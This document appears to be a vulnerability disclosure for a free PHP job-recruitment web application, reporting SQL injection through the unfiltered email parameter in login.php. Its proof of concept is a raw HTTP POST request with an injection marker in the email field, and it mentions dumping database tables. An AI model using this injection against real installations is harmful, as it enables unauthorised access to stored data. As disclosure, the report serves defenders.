# Job-recruitment-in-php has sql injection vulnerability in login.php  

## supplier
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
login.php
## describe
In login function, there is an unauthorized SQL injection vulnerability in Job_Recruitment systtem, The information of the database can be obtained without authorization, and arbitrary commands may be executed. Control parameter: **$email**

![image-20241111083226200](https://github.com/user-attachments/assets/9a180e25-02c4-48a8-8060-ad33332a5bf6)

## code analysis

The **$email** parameters of the login.php are not filtered and concatenated into the SQL statement for execution. There sql injection vulnerability.

![image-20241111083008348](https://github.com/user-attachments/assets/cda5f5fb-4223-45ff-8a34-458f3c782ba3)

## POC

```
POST /login.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/index.php/
Cookie: PHPSESSID=apdbj581m83cio8cj275e494dr
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=1*&p=123456
```

get tables from owlphin.

![image-20241111083415377](https://github.com/user-attachments/assets/96de843c-b9d7-4c26-a94b-cc11ee8f4f68)

